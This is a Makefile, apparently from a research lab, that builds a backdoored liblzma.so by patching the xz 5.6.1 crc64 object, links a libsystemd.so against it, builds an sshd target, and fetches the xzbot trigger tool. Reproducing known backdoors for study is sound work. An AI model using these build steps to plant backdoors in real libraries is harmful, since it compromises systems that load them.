CC := gcc

CPPFLAGS := -g -O2
LDFLAGS := -Wl,--no-undefined

all: liblzma.so libsystemd.so

liblzma.so: override LDFLAGS += -Wl,-soname -Wl,liblzma.so.5 -Wl,--version-script=liblzma.map -Wl,--sort-section=name,-X,-z,now
liblzma.so: liblzma.o backdoor.o table.o

libsystemd.so: override LDFLAGS += -Wl,-soname -Wl,libsystemd.so.0 -Wl,--version-script=libsystemd.map -Wl,--no-as-needed
libsystemd.so: override LDLIBS += -llzma -lgcrypt
libsystemd.so: libsystemd.o

patch.bin: patch.asm
	nasm $< -o $@

ret.bin: ret.asm
	nasm $< -o $@

table.o: table.asm
	nasm -f elf64 $< -o $@

backdoor.o: patch.bin ret.bin
	./patch liblzma_la-crc64-fast-5.6.1.o

sd_sshd:
	$(MAKE) -C sshd

xzbot:
	GOBIN=$(PWD) go install github.com/amlweems/xzbot@latest

%.so: override CPPFLAGS += -fPIC

%.so:
	$(CC) -shared $(LDFLAGS) $^ $(LDLIBS) -o $@
